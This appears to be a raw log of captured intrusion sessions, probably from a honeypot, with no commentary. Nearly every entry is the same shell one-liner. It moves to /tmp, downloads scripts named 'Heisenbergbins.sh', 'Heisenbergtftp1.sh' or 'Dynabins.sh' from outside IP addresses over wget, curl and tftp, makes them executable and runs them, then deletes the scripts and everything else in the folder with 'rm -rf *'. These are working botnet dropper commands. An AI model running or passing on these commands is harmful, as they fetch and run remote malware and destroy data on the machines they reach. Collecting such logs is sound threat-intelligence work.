# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3fbee99a1959 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 41594aec1f85 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 44295783d3b7 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 44c2f6692754 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 467c08245d45 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 4868b693077a | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 49d67cc3045c | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 4a80201d1ffd | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 4b932ba53b98 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 4c86b459edbd | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://108.174.198.111/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 108.174.198.111 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 108.174.198.111; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 4ce75d58e11c | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 4d1ce63c1bf2 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 516fda780fbf | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 52523df15c1b | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 52664c5c251d | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 56bed7f9346c | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 5774d29207d1 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 584886110336 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 5a4bb2e75cbb | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 5b6dff49caa8 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 5bd609cb66db | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 5c9ad6304df4 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 5d4876af067c | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 6210e4b0c7fb | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://108.174.198.111/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 108.174.198.111 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 108.174.198.111; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 62e5c41e641d | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 63189e180693 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 64e8540c125e | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 664bdcd8c451 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 6684cb22d279 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 69c60a4b96e1 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 6b4faaab83ae | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 6ead85cab932 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 70e49f8c62eb | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 735219f71396 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7404ac52a29b | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7757909b3826 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 78def70bb1ff | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7a675286ddb9 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7a8ed39dc8ff | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7b993d7d3a77 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7cadf70dc468 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7d2fac5ac2a7 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7e140db00e1f | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7e213a2cfff8 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7f95f864ccac | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 7f9ad7181384 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 82af5870c03f | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 82fb411a3db4 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 83ded290e26d | n_rows=1 | fi_hash=160f60200a5f9040 ---
# ...
# --- session b5073d72caba | n_rows=1 | fi_hash=b1791777be4c8ea5 ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; curl http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session cb36dbd70253 | n_rows=1 | fi_hash=b1791777be4c8ea5 ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; curl http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
